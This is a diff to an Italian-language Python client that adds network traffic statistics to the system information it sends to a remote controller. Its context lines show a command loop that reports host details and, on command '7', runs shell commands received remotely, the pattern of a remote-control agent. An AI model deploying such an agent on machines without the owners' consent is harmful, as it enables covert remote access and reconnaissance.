@@ -172,6 +172,27 @@ def getNetworkInfo():
                                 "Broadcast: " + str(indirizzo_rete.broadcast) + "\n\n"
     return intestazione+dettagli_rete
 
+def getNetworkStats():
+    intestazione = "\n=== STATISTICHE SULLA RETE === \n"
+    statistiche_rete = psutil.net_io_counters(pernic=False, nowrap=True)
+    byte_inviati = converti_byte(statistiche_rete.bytes_sent)
+    byte_ricevuti = converti_byte(statistiche_rete.bytes_recv)
+    pacchetti_inviati = statistiche_rete.packets_sent
+    pacchetti_ricevuti = statistiche_rete.packets_recv
+    tot_errori_ricezione_pacchetti = statistiche_rete.errin
+    tot_errori_invio_pacchetti = statistiche_rete.errout
+    pacchetti_in_arrivo_persi = statistiche_rete.dropin
+    pacchetti_in_uscita_persi = statistiche_rete.dropout
+    statistiche = f"Totale byte inviati: {byte_inviati}" + "\n" + \
+                  f"Totale byte ricevuti: {byte_ricevuti}" + "\n" + \
+                  f"Totale pacchetti inviati: {pacchetti_inviati}" + "\n" + \
+                  f"Totale pacchetti ricevuti: {pacchetti_ricevuti}" + "\n" + \
+                  f"Totale errori in ricezione pacchetti: {tot_errori_ricezione_pacchetti}" + "\n" + \
+                  f"Totale errori in invio pacchetti: {tot_errori_invio_pacchetti}" + "\n" + \
+                  f"Totale pacchetti in arrivo persi: {pacchetti_in_arrivo_persi}" + "\n" + \
+                  f"Totale pacchetti in uscita persi: {pacchetti_in_uscita_persi}" + "\n\n"
+    return intestazione + statistiche
+
 def executeShellCommand(cmd):
     #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi
     global cwd
@@ -237,11 +258,11 @@ while True:
     elif comando == "5":
         invia_messaggio(getDiskInfo())
     elif comando == "6":
-        invia_messaggio(getNetworkInfo())
+        invia_messaggio(getNetworkInfo()+getNetworkStats())
     elif comando.split('<sep>')[0] == "7":
         executeShellCommand(comando.split('<sep>')[1])
     elif comando == "9":
-        riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo())
+        riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo()+getNetworkStats())
         invia_messaggio(riepilogo_informazioni)
     elif comando == "0":
         break
